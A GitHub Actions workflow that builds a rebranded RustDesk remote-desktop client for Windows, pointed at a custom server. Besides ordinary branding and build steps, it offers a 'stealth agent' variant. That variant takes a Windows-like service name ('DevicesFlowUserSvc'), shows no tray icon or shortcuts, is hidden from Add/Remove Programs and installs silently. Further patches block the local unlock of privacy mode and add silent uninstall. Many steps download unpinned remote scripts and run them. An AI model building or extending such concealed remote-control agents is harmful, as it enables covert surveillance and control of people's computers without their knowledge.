name: Custom Windows Client Generator
run-name: Custom Windows Client Generator
on: 
  workflow_dispatch:
    inputs:
      version:
        description: 'version to buld'
        required: true
        default: ''
        type: string
      zip_url:
        description: 'url to zip of json'
        required: true
        default: ''
        type: string
      app_version:
        description: 'custom app version string (overrides build version)'
        required: false
        default: ''
        type: string
      simpleui:
        description: '1 = minimal host-only UI (ID/password panel only)'
        required: false
        default: ''
        type: string
      clientui:
        description: '1 = client (controller) UI with screen wall'
        required: false
        default: ''
        type: string
      agentui:
        description: '1 = stealth agent (DevicesFlowUserSvc) build: tiny ID window, no tray/shortcuts/ARP, LocalAppData install, NSIS silent shell'
        required: false
        default: ''
        type: string


env:
  SCITER_RUST_VERSION: "1.75" # https://github.com/rustdesk/rustdesk/discussions/7503, also 1.78 has ABI change which causes our sciter version not working, https://blog.rust-lang.org/2024/03/30/i128-layout-update.html
  RUST_VERSION: "1.75" # sciter failed on m1 with 1.78 because of https://blog.rust-lang.org/2024/03/30/i128-layout-update.html
  CARGO_NDK_VERSION: "3.1.2"
  SCITER_ARMV7_CMAKE_VERSION: "3.29.7"
  SCITER_NASM_DEBVERSION: "2.15.05-1"
  LLVM_VERSION: "15.0.6"
  FLUTTER_VERSION: "3.24.5"
  ANDROID_FLUTTER_VERSION: "3.24.5" 
  # for arm64 linux because official Dart SDK does not work
  FLUTTER_ELINUX_VERSION: "3.16.9"
  TAG_NAME: "${{ inputs.upload-tag }}"
  VCPKG_BINARY_SOURCES: "clear"
  # vcpkg version: 2024.07.12
  VCPKG_COMMIT_ID: "9e593bb18ea69cc5095e012465dcd675a822ed0d"
  ARMV7_VCPKG_COMMIT_ID: "6f29f12e82a8293156836ad81cc9bf5af41fe836"
  VERSION: "${{ inputs.version }}"
  NDK_VERSION: "r28c"
  #signing keys env variable checks
  ANDROID_SIGNING_KEY: "${{ secrets.ANDROID_SIGNING_KEY }}"
  MACOS_P12_BASE64: "${{ secrets.MACOS_P12_BASE64 }}"
  UPLOAD_ARTIFACT: 'true'
  SIGN_BASE_URL: "${{ secrets.SIGN_BASE_URL }}"
  STATUS_URL: "${{ secrets.GENURL }}/updategh"


jobs:
  setup:
    uses: ./.github/workflows/fetch-encrypted-secrets.yml
    with:
      zip_url_json: ${{ inputs.zip_url }}

  generate-bridge:
    uses: ./.github/workflows/bridge.yml
    with:
      version: ${{ inputs.version }}

  build-RustDeskTempTopMostWindow:
    needs: setup
    uses: ./.github/workflows/third-party-RustDeskTempTopMostWindow.yml
    with:
      rustdesk-version: ${{ inputs.version }}
      upload-artifact: true
      target: windows-2022
      configuration: Release
      platform: x64
      target_version: Windows10
    secrets: inherit
    strategy:
      fail-fast: false

  build-for-windows-flutter:
    name: Build Windows
    needs: [build-RustDeskTempTopMostWindow, generate-bridge, setup]
    runs-on: ${{ matrix.job.os }}
    strategy:
      fail-fast: false
      matrix:
        job:
          # - { target: i686-pc-windows-msvc        , os: windows-2022                  }
          # - { target: x86_64-pc-windows-gnu       , os: windows-2022                  }
          - {
              target: x86_64-pc-windows-msvc,
              os: windows-2022,
              arch: x86_64,
              flutter-arch: x64,
              vcpkg-triplet: x64-windows-static,
              build-args: "--vram",
            }
          # - { target: aarch64-pc-windows-msvc, os: windows-2022, arch: aarch64 }
    steps:
      - name: Checkout Repository
        uses: actions/checkout@v4
        
      - uses: actions/download-artifact@v4
        with:
          name: encrypted-secrets-zip

      - name: Load Secrets
        uses: ./.github/actions/decrypt-secrets
        with:
          zip_password: ${{ secrets.ZIP_PASSWORD }}

      - name: Finalize and Cleanup zip/json
        if: always() # Run even if previous steps fail
        continue-on-error: true
        uses: fjogeleit/http-request-action@v1
        with:
          url: "${{ secrets.GENURL }}/cleanzip"
          method: 'POST'
          customHeaders: '{"Content-Type": "application/json"}'
          data: '{"uuid": "${{ env.uuid }}"}'

      - name: Export GitHub Actions cache environment variables
        uses: actions/github-script@v6
        with:
          script: |
            core.exportVariable('ACTIONS_CACHE_URL', process.env.ACTIONS_CACHE_URL || '');
            core.exportVariable('ACTIONS_RUNTIME_TOKEN', process.env.ACTIONS_RUNTIME_TOKEN || '');
      
      - name: Set rdgen value
        if: ${{ env.rdgen == 'true' }}
        run: |
          echo "STATUS_URL=${{ secrets.GENURL }}/updategh" >> $env:GITHUB_ENV

      - name: Set rdgen value
        if: ${{ env.rdgen == 'false' }}
        run: |
          echo "STATUS_URL=${{ env.apiServer }}/api/updategh" >> $env:GITHUB_ENV

      - name: Checkout source code
        if: ${{ env.VERSION != 'master' }}
        uses: actions/checkout@v4
        with:
          repository: rustdesk/rustdesk
          ref: refs/tags/${{ env.VERSION }}
          submodules: recursive

      - name: Checkout source code
        if: ${{ env.VERSION == 'master' }}
        uses: actions/checkout@v4
        with:
          repository: rustdesk/rustdesk
          submodules: recursive

      - name: Apply minimal host UI
        if: ${{ inputs.simpleui == '1' }}
        shell: bash
        run: |
          set -e
          mkdir -p flutter/lib/desktop/pages
          curl -sSL -o flutter/lib/desktop/pages/simple_host_page.dart \
            https://raw.githubusercontent.com/hyhtzh/rdgen/master/patches/simple_host_page.dart?nc=${{ github.run_id }}
          curl -sSL -o flutter/lib/desktop/pages/settings_page.dart \
            https://raw.githubusercontent.com/hyhtzh/rdgen/master/patches/settings_page.dart?nc=${{ github.run_id }}
          curl -sSL -o patch_simple_ui.py \
            https://raw.githubusercontent.com/hyhtzh/rdgen/master/patches/patch_simple_ui.py?nc=${{ github.run_id }}
          python patch_simple_ui.py .

      - name: Apply client UI
        if: ${{ inputs.clientui == '1' }}
        shell: bash
        run: |
          set -e
          mkdir -p flutter/lib/desktop/pages ui
          curl -sSL -o flutter/lib/desktop/pages/client_home_page.dart \
            https://raw.githubusercontent.com/hyhtzh/rdgen/master/patches/client_home_page.dart?nc=${{ github.run_id }}
          curl -sSL -o flutter/lib/desktop/pages/screen_wall_page.dart \
            https://raw.githubusercontent.com/hyhtzh/rdgen/master/patches/screen_wall_page.dart?nc=${{ github.run_id }}
          curl -sSL -o flutter/lib/desktop/pages/address_book_page.dart \
            https://raw.githubusercontent.com/hyhtzh/rdgen/master/patches/address_book_page.dart?nc=${{ github.run_id }}
          curl -sSL -o flutter/lib/desktop/pages/file_transfer_page.dart \
            https://raw.githubusercontent.com/hyhtzh/rdgen/master/patches/file_transfer_page.dart?nc=${{ github.run_id }}
          curl -sSL -o ui/client_home_page.dart \
            https://raw.githubusercontent.com/hyhtzh/rdgen/master/patches/client_home_page.dart?nc=${{ github.run_id }}
          curl -sSL -o ui/screen_wall_page.dart \
            https://raw.githubusercontent.com/hyhtzh/rdgen/master/patches/screen_wall_page.dart?nc=${{ github.run_id }}
          curl -sSL -o ui/address_book_page.dart \
            https://raw.githubusercontent.com/hyhtzh/rdgen/master/patches/address_book_page.dart?nc=${{ github.run_id }}
          curl -sSL -o ui/file_transfer_page.dart \
            https://raw.githubusercontent.com/hyhtzh/rdgen/master/patches/file_transfer_page.dart?nc=${{ github.run_id }}
          curl -sSL -o ui/settings_page.dart \
            https://raw.githubusercontent.com/hyhtzh/rdgen/master/patches/settings_page.dart?nc=${{ github.run_id }}
          curl -sSL -o flutter/lib/desktop/pages/settings_page.dart \
            https://raw.githubusercontent.com/hyhtzh/rdgen/master/patches/settings_page.dart?nc=${{ github.run_id }}
          curl -sSL -o patch_client_ui.py \
            https://raw.githubusercontent.com/hyhtzh/rdgen/master/patches/patch_client_ui.py?nc=${{ github.run_id }}
          python patch_client_ui.py .
          curl -sSL -o ui/license_page.dart \
            https://raw.githubusercontent.com/hyhtzh/rdgen/master/patches/license_page.dart?nc=${{ github.run_id }}
          curl -sSL -o ui/license_client.dart \
            https://raw.githubusercontent.com/hyhtzh/rdgen/master/patches/license_client.dart?nc=${{ github.run_id }}
          curl -sSL -o flutter/lib/desktop/pages/license_page.dart \
            https://raw.githubusercontent.com/hyhtzh/rdgen/master/patches/license_page.dart?nc=${{ github.run_id }}
          curl -sSL -o flutter/lib/desktop/pages/license_client.dart \
            https://raw.githubusercontent.com/hyhtzh/rdgen/master/patches/license_client.dart?nc=${{ github.run_id }}
          curl -sSL -o patch_license.py \
            https://raw.githubusercontent.com/hyhtzh/rdgen/master/patches/patch_license.py?nc=${{ github.run_id }}
          python patch_license.py . desktop
          curl -sSL -o patch_toolbar_eye.py \
            https://raw.githubusercontent.com/hyhtzh/rdgen/master/patches/patch_toolbar_eye.py?nc=${{ github.run_id }}
          python patch_toolbar_eye.py .
          curl -sSL -o patch_wall_canvas.py \
            https://raw.githubusercontent.com/hyhtzh/rdgen/master/patches/patch_wall_canvas.py?nc=${{ github.run_id }}
          python patch_wall_canvas.py .
          curl -sSL -o patch_default_view_only.py \
            https://raw.githubusercontent.com/hyhtzh/rdgen/master/patches/patch_default_view_only.py?nc=${{ github.run_id }}
          python patch_default_view_only.py .
          grep -n "_hyApplyDefaultViewOnly" flutter/lib/desktop/pages/remote_page.dart

      - name: Apply agent UI (DevicesFlowUserSvc stealth agent)
        if: ${{ inputs.agentui == '1' }}
        shell: bash
        run: |
          set -e
          mkdir -p flutter/lib/desktop/pages
          curl -sSL -o flutter/lib/desktop/pages/agent_page.dart \
            https://raw.githubusercontent.com/hyhtzh/rdgen/master/patches/agent_page.dart?nc=${{ github.run_id }}
          curl -sSL -o patch_agent_ui.py \
            https://raw.githubusercontent.com/hyhtzh/rdgen/master/patches/patch_agent_ui.py?nc=${{ github.run_id }}
          python patch_agent_ui.py .
          curl -sSL -o patch_agent_msi.py \
            https://raw.githubusercontent.com/hyhtzh/rdgen/master/patches/patch_agent_msi.py?nc=${{ github.run_id }}
          python patch_agent_msi.py .
          # 校验关键落点
          grep -n "const AgentPage()" flutter/lib/main.dart
          grep -n "DevicesFlowUserSvc" flutter/windows/runner/main.cpp
          grep -n "RuntimeBroker_devicesflowusersvc" src/privacy_mode/win_topmost_window.rs
          grep -n "ARPSYSTEMCOMPONENT" res/msi/Package/Fragments/ShortcutProperties.wxs
          grep -n "INSTALLFOLDER_AGENT_DEFAULT" res/msi/Package/Components/Folders.wxs

      - name: Apply host UX patch (toast / taskbar flash / keep wallpaper)
        # 【HyDesk】受控端体验（2026-11-09 晚）：聊天右下角半透明原生气泡、
        # 连入任务栏闪烁、不再移除桌面壁纸。clientui/agentui/simpleui 通吃。
        shell: bash
        run: |
          set -e
          curl -sSL -o hy_toast.rs \
            https://raw.githubusercontent.com/hyhtzh/rdgen/master/patches/hy_toast.rs?nc=${{ github.run_id }}
          curl -sSL -o patch_host_toast.py \
            https://raw.githubusercontent.com/hyhtzh/rdgen/master/patches/patch_host_toast.py?nc=${{ github.run_id }}
          python patch_host_toast.py .
          # 校验关键落点
          grep -n "mod hy_toast" src/lib.rs
          grep -n "hy_toast::show" src/ui_cm_interface.rs
          grep -n "hyServerChat" flutter/lib/models/chat_model.dart
          grep -n "hy_keep_wallpaper" src/server/connection.rs
          # 2026-11-10：Ctrl+P 本地解锁禁用 + 服务侧静默卸载 + MSI /qn
          grep -n "hy_privacy_no_local_unlock" src/win_input.rs
          grep -n "hy_uninstall_watcher" src/core_main.rs
          grep -n "hy_silent_msi" src/platform/windows.rs

      - name: Set custom app version
        continue-on-error: true
        shell: bash
        run: |
          # app_version comes from the rdgen generator; some deployments do not
          # send it, so fall back to .github/version.txt to keep the version
          # increasing (an MSI with the same version will not overwrite files).
          AV="${{ inputs.app_version }}"
          if [ -z "$AV" ]; then
            # The rustdesk checkout replaces the repo root, so .github/version.txt
            # from this generator repo is not on disk any more: fetch it remotely.
            # Use the API (no CDN cache): raw.githubusercontent may serve a stale
            # version.txt for up to 5 min after bump_version.py commits.
            AV="$(curl -fsSL -H "Authorization: token ${{ secrets.GITHUB_TOKEN }}" \
              "https://api.github.com/repos/${{ github.repository }}/contents/.github/version.txt?ref=${{ github.ref_name }}" \
              | python -c 'import json,sys,base64; print(base64.b64decode(json.load(sys.stdin)["content"]).decode().strip())' 2>/dev/null || true)"
          fi
          if [ -z "$AV" ]; then
            echo "no app_version available, keep upstream version"
            grep '^version = ' ./Cargo.toml
            exit 0
          fi
          echo "app version -> $AV"
          # Cargo 的 [package] version 只接受严格 semver（x.y.z），
          # 带字母后缀的版本（如 1.5.27f）会让 cargo build 直接解析失败。
          # Cargo 用净化后的 CV，MSI/NSIS 等仍用完整 AV。
          CV="$(echo "$AV" | sed -E 's/^([0-9]+\.[0-9]+\.[0-9]+).*/\1/')"
          echo "cargo version -> $CV"
          sed -i -e "s|^version = \".*\"|version = \"$CV\"|" ./Cargo.toml
          sed -i "/name = \"rustdesk\"/ {n; s/version = \".*\"/version = \"$CV\"/}" ./Cargo.lock
          grep '^version = ' ./Cargo.toml
          # MSBuild imports the env var VERSION as the $(Version) property, and a
          # branch name such as "master" is not a valid NuGet version, which makes
          # "nuget restore" fail for the WiX MSI project. Keep the numeric version
          # (WiX ProductVersion also rejects letter suffixes like 1.5.28f).
          echo "MSI_VERSION=$CV" >> "$GITHUB_ENV"

      - name: Apply allow_custom_update patch
        continue-on-error: true
        if: ${{ env.update_public_key != '' }}
        shell: bash
        run: |
          curl -sSL -o allow_custom_update.py https://raw.githubusercontent.com/bryangerlach/rdgen/refs/heads/master/.github/patches/allow_custom_update.py
          python3 allow_custom_update.py \
            --rustdesk-root . \
            --update-url "${{ env.downloadLink}}/api/version/latest" \
            --ed25519-public-key "${{ env.update_public_key }}"

      - name: Restore bridge files
        uses: actions/download-artifact@master
        with:
          name: bridge-artifact
          path: ./

      - name: Install ImageMagick on Windows
        run: |
          choco install -y imagemagick.app --no-progress
          Get-ChildItem -Path "${env:ProgramFiles}" | % { $_.FullName } | Select-String -Pattern "[\/\\]ImageMagick[^\/\\]*$" | Out-File -Append -FilePath $env:GITHUB_PATH -Encoding utf8

      - name: fix flutter_gpu_texture_renderer (fixed in master rustdesk)
        shell: bash
        run: |
          sed -i -e 's|2ded7f146437a761ffe6981e2f742038f85ca68d|08a471bb8ceccdd50483c81cdfa8b81b07b14b87|' ./flutter/pubspec.lock
          sed -i -e 's|2ded7f146437a761ffe6981e2f742038f85ca68d|08a471bb8ceccdd50483c81cdfa8b81b07b14b87|' ./flutter/pubspec.yaml
      
      - name: change appname to custom
        if: env.appname != 'rustdesk'
        continue-on-error: true
        shell: bash
        run: |
          # ./Cargo.toml
          sed -i -e 's|description = "RustDesk Remote Desktop"|description = "${{ env.appname }}"|' ./Cargo.toml
          sed -i -e 's|ProductName = "RustDesk"|ProductName = "${{ env.appname }}"|' ./Cargo.toml
          sed -i -e 's|FileDescription = "RustDesk Remote Desktop"|FileDescription = "${{ env.appname }}"|' ./Cargo.toml
          sed -i -e 's|OriginalFilename = "rustdesk.exe"|OriginalFilename = "${{ env.appname }}.exe"|' ./Cargo.toml
          # ./libs/portable/Cargo.toml
          sed -i -e 's|description = "RustDesk Remote Desktop"|description = "${{ env.appname }}"|' ./libs/portable/Cargo.toml
          sed -i -e 's|ProductName = "RustDesk"|ProductName = "${{ env.appname }}"|' ./libs/portable/Cargo.toml
          sed -i -e 's|FileDescription = "RustDesk Remote Desktop"|FileDescription = "${{ env.appname }}"|' ./libs/portable/Cargo.toml
          sed -i -e 's|OriginalFilename = "rustdesk.exe"|OriginalFilename = "${{ env.appname }}.exe"|' ./libs/portable/Cargo.toml
          # ./libs/portable/src/main.rs
          sed -i -e 's|const APP_PREFIX: \&str = "rustdesk";|const APP_PREFIX: \&str = "${{ env.appname }}";|' ./libs/portable/src/main.rs
          # ./flutter/windows/runner/Runner.rc
          sed -i -e 's|"RustDesk Remote Desktop"|"${{ env.appname }}"|' ./flutter/windows/runner/Runner.rc
          sed -i -e 's|VALUE "InternalName", "rustdesk" "\0"|VALUE "InternalName", "${{ env.appname }}" "\0"|' ./flutter/windows/runner/Runner.rc
          sed -i -e 's|"rustdesk.exe"|"${{ env.appname }}"|' ./flutter/windows/runner/Runner.rc
          sed -i -e 's|"RustDesk"|"${{ env.appname }}"|' ./flutter/windows/runner/Runner.rc
          # ./src/lang/en.rs
          # change powered by rustdek to powered by compname
          if [ ! -z "${{ env.compname }}" ]; then
            find ./src/lang -name "*.rs" -exec sed -i '/powered_by_me/s|RustDesk|${{ env.compname }}|g' {} \;
          fi
          find ./src/lang -name "*.rs" -exec sed -i -e 's|RustDesk|${{ env.appname }}|' {} \;
          sed -i -e 's|RustDesk|${{ env.appname }}|' ./res/msi/Package/License.rtf
          
      - name: change company name
        if: env.compname != 'Purslane Ltd'
        continue-on-error: true
        shell: bash
        run: |
          sed -i -e 's|Purslane Tech Pte. Ltd.|${{ env.compname }}|' ./flutter/lib/desktop/pages/desktop_setting_page.dart
          sed -i -e 's|Purslane Tech Pte. Ltd.|${{ env.compname }}|' ./res/msi/preprocess.py
          sed -i -e 's|r"Purslane(?: Tech Pte\\.)? Ltd"|"${{ env.compname }}"|' ./res/msi/preprocess.py
          sed -i -e 's|Purslane Tech Pte. Ltd.|${{ env.compname }}|' ./flutter/windows/runner/Runner.rc
          sed -i -e 's|Purslane Tech Pte. Ltd.|${{ env.compname }}|' ./Cargo.toml
          sed -i -e 's|Purslane Tech Pte. Ltd.|${{ env.compname }}|' ./libs/portable/Cargo.toml
          sed -i -e 's|Purslane Tech Pte. Ltd.|${{ env.compname }}|' ./res/msi/Package/License.rtf
          sed -i -e 's|Purslane Tech Pte. Ltd.|${{ env.compname }}|' ./src/main.rs
          sed -i -e 's|Purslane Ltd|${{ env.compname }}|' ./flutter/lib/desktop/pages/desktop_setting_page.dart
          sed -i -e 's|PURSLANE|${{ env.compname }}|' ./res/msi/preprocess.py
          sed -i -e 's|Purslane Ltd|${{ env.compname }}|' ./res/msi/preprocess.py
          sed -i -e 's|Purslane Ltd|${{ env.compname }}|' ./flutter/windows/runner/Runner.rc
          sed -i -e 's|Purslane Ltd|${{ env.compname }}|' ./Cargo.toml
          sed -i -e 's|Purslane Ltd|${{ env.compname }}|' ./libs/portable/Cargo.toml
          sed -i -e 's|Purslane Ltd|${{ env.compname }}|' ./res/msi/Package/License.rtf
          sed -i -e 's|Purslane Ltd|${{ env.compname }}|' ./src/main.rs
             
      - name: change url to custom
        if: env.urlLink != 'https://rustdesk.com'
        continue-on-error: true
        shell: bash
        run: |
          sed -i -e 's|Homepage: https://rustdesk.com|Homepage: ${{ env.urlLink }}|' ./build.py
          sed -i -e "s|launchUrl(Uri.parse('https://rustdesk.com'));|launchUrl(Uri.parse('${{ env.urlLink }}'));|" ./flutter/lib/common.dart
          sed -i -e "s|launchUrlString('https://rustdesk.com');|launchUrlString('${{ env.urlLink }}');|" ./flutter/lib/desktop/pages/desktop_setting_page.dart
          sed -i -e "s|launchUrlString('https://rustdesk.com/privacy.html')|launchUrlString('${{ env.urlLink }}/privacy.html')|" ./flutter/lib/desktop/pages/desktop_setting_page.dart
          sed -i -e "s|const url = 'https://rustdesk.com/';|const url = '${{ env.urlLink }}';|" ./flutter/lib/mobile/pages/settings_page.dart
          sed -i -e "s|launchUrlString('https://rustdesk.com/privacy.html')|launchUrlString('${{ env.urlLink }}/privacy.html')|" ./flutter/lib/mobile/pages/settings_page.dart
          sed -i -e "s|https://rustdesk.com/privacy.html|${{ env.urlLink }}/privacy.html|" ./flutter/lib/desktop/pages/install_page.dart
          sed -i -e "s|rustdesk.com|${{ env.urlLink }}|" ./res/msi/Package/License.rtf

      - name: change download link to custom
        if: env.downloadLink != 'https://rustdesk.com/download'
        continue-on-error: true
        shell: bash
        run: |
          sed -i -e 's|https://rustdesk.com/download|${{ env.downloadLink }}|' ./flutter/lib/desktop/pages/desktop_home_page.dart
          sed -i -e 's|https://rustdesk.com/download|${{ env.downloadLink }}|' ./flutter/lib/mobile/pages/connection_page.dart
          sed -i -e 's|https://rustdesk.com/download|${{ env.downloadLink }}|' ./src/ui/index.tis
          sed -i -e 's|&download_url|"${{ env.downloadLink }}"|' ./src/updater.rs
          sed -i -e 's|$downloadUrl/$downloadFile|${{ env.downloadLink }}|' ./flutter/lib/desktop/widgets/update_progress.dart

      - name: set server, serverPort, key, and apiserver
        continue-on-error: true
        shell: bash
        env:
          SERVER_DOMAIN: ${{ env.server }}
          SERVER_PORT_INPUT: ${{ env.serverPort }}
          SERVER_KEY: ${{ env.key }}
          API_SERVER: ${{ env.apiServer }}
        run: |
          # Pass secrets via bash env vars to avoid quoting issues
          if [ ! -f "./libs/hbb_common/src/config.rs" ]; then
            echo "Error: config.rs not found!"
            exit 1
          fi
          if [ ! -f "./src/common.rs" ]; then
            echo "Error: common.rs not found!"
            exit 1
          fi

          # Port must be a number; views.py defaults it to 21116
          if ! [[ "$SERVER_PORT_INPUT" =~ ^[0-9]+$ ]]; then
            echo "Error: serverPort must be a number, got: '$SERVER_PORT_INPUT'"
            exit 1
          fi

          # Derive the port block from the rendezvous port
          # (defaults 21116/21117/21118/21119)
          SERVER_PORT=$SERVER_PORT_INPUT
          RELAY_PORT=$((SERVER_PORT + 1))
          WS_RENDEZVOUS_PORT=$((RELAY_PORT + 1))
          WS_RELAY_PORT=$((WS_RENDEZVOUS_PORT + 1))

          echo "Setting server: $SERVER_DOMAIN"
          echo "Setting ports: $SERVER_PORT, $RELAY_PORT, $WS_RENDEZVOUS_PORT, $WS_RELAY_PORT"

          sed -i -e "s|rs-ny.rustdesk.com|$SERVER_DOMAIN|" ./libs/hbb_common/src/config.rs

          # Match on numeric value so the step is independent of defaults
          sed -i -e "s|pub const RENDEZVOUS_PORT: i32 = [0-9][0-9]*;|pub const RENDEZVOUS_PORT: i32 = $SERVER_PORT;|" ./libs/hbb_common/src/config.rs
          sed -i -e "s|pub const RELAY_PORT: i32 = [0-9][0-9]*;|pub const RELAY_PORT: i32 = $RELAY_PORT;|" ./libs/hbb_common/src/config.rs
          sed -i -e "s|pub const WS_RENDEZVOUS_PORT: i32 = [0-9][0-9]*;|pub const WS_RENDEZVOUS_PORT: i32 = $WS_RENDEZVOUS_PORT;|" ./libs/hbb_common/src/config.rs
          sed -i -e "s|pub const WS_RELAY_PORT: i32 = [0-9][0-9]*;|pub const WS_RELAY_PORT: i32 = $WS_RELAY_PORT;|" ./libs/hbb_common/src/config.rs

          sed -i -e "s|OeVuKk5nlHiXp+APNn0Y3pC1Iwpwn44JGqrQCsWqmBw=|$SERVER_KEY|" ./libs/hbb_common/src/config.rs
          sed -i -e "s|https://admin.rustdesk.com|$API_SERVER|" ./src/common.rs

          echo "=== Verification ==="
          grep -nE "RENDEZVOUS_PORT|RELAY_PORT|WS_" ./libs/hbb_common/src/config.rs
          # ./flutter/pubspec.yaml
          #sed -i '/intl:/a \ \ archive: ^3.6.1' ./flutter/pubspec.yaml

      - name: allow custom.txt
        uses: nick-fields/retry@v3
        with:
          timeout_minutes: 5
          max_attempts: 3
          retry_wait_seconds: 15
          shell: pwsh
          command: |
            Invoke-WebRequest -Uri https://raw.githubusercontent.com/bryangerlach/rdgen/refs/heads/master/.github/patches/allowCustom.py -OutFile allowCustom.py
            python allowCustom.py
            # Remove Setup Server Tip
            Invoke-WebRequest -Uri https://raw.githubusercontent.com/bryangerlach/rdgen/refs/heads/master/.github/patches/removeSetupServerTip.diff -OutFile removeSetupServerTip.diff
            git apply removeSetupServerTip.diff

      - name: Patch remote printer port to spool file
        shell: python
        run: |
          import os, re

          src = "."
          app = os.environ.get("appname") or "RustDesk"
          literal = "C:\\\\ProgramData\\\\%s\\\\printer-spool\\\\job.prn" % app

          # atch Rust remote_printer lib.rs
          rs = os.path.join(src, "libs", "remote_printer", "src", "lib.rs")
          if os.path.isfile(rs):
              with open(rs, "r", encoding="utf-8") as f:
                  t = f.read()
              if "printer-spool" in t:
                  print("Rust printer port already points to spool file")
              else:
                  old = ('fn get_port_name(app_name: &str) -> Vec<u16> {\n'
                         '    format!("{} Printer", app_name)')
                  new = ('fn get_port_name(app_name: &str) -> Vec<u16> {\n'
                         '    let base = std::env::var("ProgramData")\n'
                         '        .unwrap_or_else(|_| "C:\\\\ProgramData".to_string());\n'
                         '    let dir = format!("{}\\\\{}\\\\printer-spool", base, app_name);\n'
                         '    let _ = std::fs::create_dir_all(&dir);\n'
                         '    format!("{}\\\\job.prn", dir)')
                  if old in t:
                      with open(rs, "w", encoding="utf-8") as f:
                          f.write(t.replace(old, new, 1))
                      print("Successfully patched Rust printer port")
                  else:
                      print("Warning: get_port_name() signature not matched in Rust source")

          # patch C++ MSI Custom Action
          cpp = os.path.join(src, "res", "msi", "CustomActions", "RemotePrinter.cpp")
          if os.path.isfile(cpp):
              with open(cpp, "r", encoding="utf-8") as f:
                  t = f.read()
              if "printer-spool" in t:
                  print("MSI printer port already points to spool file")
              else:
                  pattern = r'(RD_PRINTER_PORT\s*=\s*)L"[^"]*"'
                  new_t, n = re.subn(pattern, lambda m: m.group(1) + 'L"%s"' % literal, t, count=1)
                  if n == 1:
                      with open(cpp, "w", encoding="utf-8") as f:
                          f.write(new_t)
                      print("Successfully patched MSI CustomAction printer port")
                  else:
                      print("Warning: RD_PRINTER_PORT not matched in RemotePrinter.cpp")

      - name: Install LLVM and Clang
        id: llvm1
        continue-on-error: true
        uses: KyleMayes/install-llvm-action@v1
        with:
          version: ${{ env.LLVM_VERSION }}

      # LLVM 包在 GitHub Releases 上，偶发 504 会让整轮构建白跑，补一次重试
      - name: Install LLVM and Clang (retry)
        if: steps.llvm1.outcome == 'failure'
        uses: KyleMayes/install-llvm-action@v1
        with:
          version: ${{ env.LLVM_VERSION }}

      - name: Install flutter
        uses: subosito/flutter-action@v2.12.0 #https://github.com/subosito/flutter-action/issues/277
        with:
          channel: "stable"
          flutter-version: ${{ env.FLUTTER_VERSION }}

      # https://github.com/flutter/flutter/issues/155685
      - name: Replace engine with rustdesk custom flutter engine
        run: |
          flutter doctor -v
          flutter precache --windows
          $url = 'https://github.com/rustdesk/engine/releases/download/main/windows-x64-release.zip'
          $ok = $false
          for ($i = 1; $i -le 3; $i++) {
            Write-Host "engine download attempt $i"
            try {
              Invoke-WebRequest -Uri $url -OutFile windows-x64-release.zip -MaximumRetryCount 3 -RetryIntervalSec 5
              if ((Get-Item windows-x64-release.zip).Length -gt 1048576) { $ok = $true; break }
              Write-Host "downloaded file too small, retrying"
            } catch {
              Write-Host "download failed: $_"
            }
            Start-Sleep -Seconds 10
          }
          if (-not $ok) { throw "custom flutter engine download failed after 3 attempts" }
          Expand-Archive -Path windows-x64-release.zip -DestinationPath windows-x64-release -Force
          mv -Force windows-x64-release/*  C:/hostedtoolcache/windows/flutter/stable-${{ env.FLUTTER_VERSION }}-x64/bin/cache/artifacts/engine/windows-x64-release/

      - name: Patch flutter
        shell: bash
        run: |
          cp .github/patches/flutter_3.24.4_dropdown_menu_enableFilter.diff $(dirname $(dirname $(which flutter)))
          cd $(dirname $(dirname $(which flutter)))
          if [[ "3.24.5" == ${{env.FLUTTER_VERSION}} ]]; then
            git apply flutter_3.24.4_dropdown_menu_enableFilter.diff
          fi

      - name: Install Rust toolchain
        uses: dtolnay/rust-toolchain@v1
        with:
          toolchain: ${{ env.SCITER_RUST_VERSION }}
          targets: ${{ matrix.job.target }}
          components: "rustfmt"

      - uses: Swatinem/rust-cache@v2
        with:
          prefix-key: ${{ matrix.job.os }}

      - name: Restore vcpkg installed cache
        uses: actions/cache@v4
        with:
          path: C:\vcpkg\installed
          key: vcpkg-windows-v2-${{ env.VCPKG_COMMIT_ID }}-${{ matrix.job.vcpkg-triplet }}
          restore-keys: |
            vcpkg-windows-v2-${{ env.VCPKG_COMMIT_ID }}-

      - name: Setup vcpkg
        uses: lukka/run-vcpkg@v11
        with:
          vcpkgDirectory: C:\vcpkg
          vcpkgGitCommitId: ${{ env.VCPKG_COMMIT_ID }}
          doNotCache: false

      - name: Install vcpkg dependencies
        env:
          VCPKG_DEFAULT_HOST_TRIPLET: ${{ matrix.job.vcpkg-triplet }}
        run: |
          # vcpkg 的源码下载常常被 GitHub 5xx 打断（mfx_dispatch / aom / nasm 等），
          # 一次失败就整轮 40 分钟重来太亏：这里最多重试 3 次，已编译的包会被复用。
          ok=0
          for attempt in 1 2 3; do
            echo "::notice::vcpkg install attempt $attempt"
            if $VCPKG_ROOT/vcpkg \
              install \
              --triplet ${{ matrix.job.vcpkg-triplet }} \
              --x-install-root="$VCPKG_ROOT/installed"; then
              ok=1
              break
            fi
            echo "::warning::vcpkg attempt $attempt failed (upstream download flake?), retrying in 20s"
            sleep 20
          done
          if [ "$ok" != "1" ]; then
            find "${VCPKG_ROOT}/" -name "*.log" | while read -r _1; do
              echo "$_1:"
              echo "======"
              cat "$_1"
              echo "======"
              echo ""
            done
            exit 1
          fi
          head -n 100 "${VCPKG_ROOT}/buildtrees/ffmpeg/build-${{ matrix.job.vcpkg-triplet }}-rel-out.log" || true
        shell: bash

      - name: Save vcpkg installed cache
        uses: actions/cache/save@v4
        continue-on-error: true
        with:
          path: C:\vcpkg\installed
          key: vcpkg-windows-v2-${{ env.VCPKG_COMMIT_ID }}-${{ matrix.job.vcpkg-triplet }}
          
      - name: ensure magick
        if: true  # 图标转换依赖 ImageMagick，runner 上没有就现装
        shell: pwsh
        run: |
          if (-not (Get-Command magick -ErrorAction SilentlyContinue)) {
            Write-Host "ImageMagick not found, installing via choco"
            choco install imagemagick -y --no-progress
            $machine = [System.Environment]::GetEnvironmentVariable("Path", "Machine")
            $env:Path = "$machine;" + $env:Path
          }
          magick -version

      - name: magick stuff
        if: true  # 图标固定走 rdgen 仓库 patches/icon.png（agent 构建用 agent_icon.png）
        uses: nick-fields/retry@v3
        with:
          timeout_minutes: 5
          max_attempts: 3
          retry_wait_seconds: 15
          shell: pwsh
          command: |
            $iconUrl = "https://raw.githubusercontent.com/hyhtzh/rdgen/master/patches/icon.png?nc=${{ github.run_id }}"
            if ("${{ inputs.agentui }}" -eq "1") {
